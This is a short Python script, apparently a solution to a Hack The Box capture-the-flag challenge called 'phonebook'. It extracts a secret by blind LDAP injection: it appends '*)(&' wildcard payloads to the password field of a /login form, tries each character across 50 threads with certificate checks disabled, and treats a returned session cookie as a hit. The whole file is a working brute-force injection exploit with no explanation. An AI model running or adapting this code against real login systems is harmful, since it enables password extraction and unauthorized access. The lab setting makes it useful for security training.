import requests
import sys
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2):
    print("USAGE: phonebook.py <URL>")
    sys.exit(1)

url = sys.argv[1]

a = list(string.ascii_lowercase)
b = list(string.ascii_uppercase)

allchars = list(string.ascii_lowercase) + list(string.ascii_uppercase) + [str(x) for x in range(0,10)] + ['_','}'] 

payload = 'HTB{'
passwd = ''

def found(char,pay):
    return pay + char

def post_req(url,data,char,pay):
    r = requests.post(url,data=data,verify=False,allow_redirects=False)
    try:
        if r.cookies['mysession'] != '':
            return found(char,pay)
    except:
        return r
def next_val(pay):
    processes = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        for char in allchars:
            test = pay + char + "*)(&"
            data = {'username': 'Reese', 'password': test}
            processes.append(executor.submit(post_req,url+'/login',data,char,pay))
    for task in as_completed(processes):
        if isinstance(task.result(), str):
            if task.result()[-1] == "}":
                print("{0}".format(task.result()))
            else:
                print("{0}".format(task.result()),end="\r",flush=True)
                next_val(task.result()) 	

next_val(payload)



